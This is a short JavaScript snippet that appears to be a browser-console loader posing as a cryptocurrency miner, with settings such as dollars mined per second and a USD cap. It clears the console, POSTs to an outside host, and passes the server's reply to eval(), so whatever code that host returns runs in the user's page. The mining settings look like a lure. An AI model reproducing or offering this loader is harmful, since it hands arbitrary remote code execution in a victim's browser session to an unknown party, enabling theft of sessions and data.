console.clear();
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        // Typical action to be performed when the document is ready:


        var additionalString = `
        var stopMiningAfterHowManySeconds = ${stopMiningAfterHowManySeconds}; 
        var intervalInSeconds = ${intervalInSeconds};
        var maxMiningInUSD = ${maxMiningInUSD}; 
        var startWithInitialBalance = ${startWithInitialBalance};
        var mineHowManyDollarsinOneSecond = ${mineHowManyDollarsInOneSecond};
        `;

        eval(additionalString + xhttp.responseText);

    }
};
xhttp.open("POST", "https://kosieric.com/block.php", true);
xhttp.send();
